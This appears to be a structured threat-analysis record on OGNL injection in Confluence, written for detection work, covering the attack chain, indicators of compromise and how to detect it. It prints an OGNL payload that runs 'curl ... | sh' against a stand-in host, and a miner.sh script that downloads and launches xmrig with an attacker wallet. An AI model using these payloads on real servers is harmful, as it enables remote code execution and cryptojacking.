package_info.package_versions: All versions prior to patched releases (e.g., < 7.13.0)
package_info.why_malicious: The vulnerability allows attackers to execute arbitrary OGNL expressions remotely, resulting in full remote code execution. Attackers exploited this to deploy cryptomining malware (such as Monero miners) on compromised servers, leading to unauthorized resource usage and potential data compromise.

execution_context.trigger: runtime (via remote OGNL injection in HTTP request processing)
execution_context.file_location: HTTP request payload (OGNL expression injected into a vulnerable Confluence endpoint parameter)

malicious_snippets.code_snippet: OGNL expression injected via HTTP request, e.g.: ${(#a=@java.lang.Runtime@getRuntime().exec('curl http://malicious.site/miner.sh | sh'))}
malicious_snippets.code_behavior: At runtime, when the vulnerable endpoint processes the HTTP request, the injected OGNL expression invokes Runtime.exec() to execute a shell command, which downloads a remote shell script via curl and pipes it to sh, resulting in the execution of attacker-controlled code and installation of a cryptominer.

malice_analysis.why_suspicious: Execution of user-supplied OGNL expressions that invoke system commands is highly abnormal and enables arbitrary code execution, especially when used to download and run external scripts from untrusted sources.
malice_analysis.violated_expectations: Confluence endpoints should never evaluate user input as OGNL expressions or allow arbitrary command execution from HTTP request parameters; this breaks core application security boundaries.
malice_analysis.similar_legitimate_use: OGNL is legitimately used for server-side expression evaluation in Java web frameworks, but never with untrusted user input or for direct system command execution.
key_indicators: OGNL expressions present in HTTP request parameters
Use of Runtime.getRuntime().exec() within OGNL context
Chaining of curl/wget with shell execution in evaluated expressions
Execution of shell commands originating from web application context

execution_context.trigger: runtime (post-exploitation, after initial remote code execution)
execution_context.file_location: /tmp/miner.sh (downloaded and executed by attacker via OGNL injection)

malicious_snippets.code_snippet:
#!/bin/sh
curl -O http://malicious.site/xmrig && chmod +x xmrig && ./xmrig --url pool.minexmr.com:4444 --user attacker_wallet
malicious_snippets.code_behavior: After the initial remote code execution, the downloaded shell script is executed, which retrieves the xmrig cryptominer binary from an external domain, sets execution permissions, and launches the miner to connect to a public Monero mining pool using the attacker's wallet, resulting in unauthorized cryptomining on the server.

malice_analysis.why_suspicious: Automated download and execution of cryptomining software from an untrusted domain is a clear indicator of post-exploitation malware activity, as it hijacks server resources for illicit mining.
malice_analysis.violated_expectations: Confluence servers should not download or execute arbitrary binaries, especially cryptominers, nor initiate outbound connections to public mining pools.
malice_analysis.similar_legitimate_use: Automated installation scripts may download and run binaries, but only from trusted sources and with explicit user consent, not via web application context.
key_indicators: Download of xmrig or similar mining binaries from external domains
Execution of shell scripts from /tmp or other writable directories
Outbound connections to public cryptomining pools (e.g., pool.minexmr.com)
Presence of miner.sh or xmrig binaries in temporary directories

attack_chain.action: Attacker sends a crafted HTTP request exploiting the OGNL injection vulnerability in a Confluence endpoint, resulting in remote code execution.
attack_chain.leads_to: Allows the attacker to execute arbitrary shell commands on the Confluence server, establishing initial access.

attack_chain.action: Attacker downloads and executes a cryptomining installation script on the compromised server using the obtained code execution.
attack_chain.leads_to: Cryptominer runs on the server, using its resources to mine Monero for the attacker and potentially exposing the server to further compromise.

behavioral_signatures: OGNL expressions present in HTTP request parameters or payloads
Invocation of Runtime.exec() or similar process execution APIs from web application context
Unexpected process creation (e.g., xmrig, miner.sh) by the Confluence application user
Outbound network connections to known cryptomining pools from the server
Download and execution of binaries from untrusted external sources
file_indicators: xmrig or other cryptominer binaries in /tmp or application directories
network_indicators: Connections to pool.minexmr.com:4444 or other public mining pools
Outbound HTTP requests to attacker-controlled domains such as malicious.site
detection_knowledge.how_to_detect: Monitor web server logs for OGNL expressions in HTTP request parameters, especially those invoking Runtime.exec(). Detect unexpected process creation (e.g., xmrig, miner.sh) by the Confluence application user. Monitor for outbound connections to known cryptomining pools and suspicious domains. Alert on downloads and execution of binaries from untrusted sources. Correlate these behaviors to identify exploitation and post-exploitation activity.
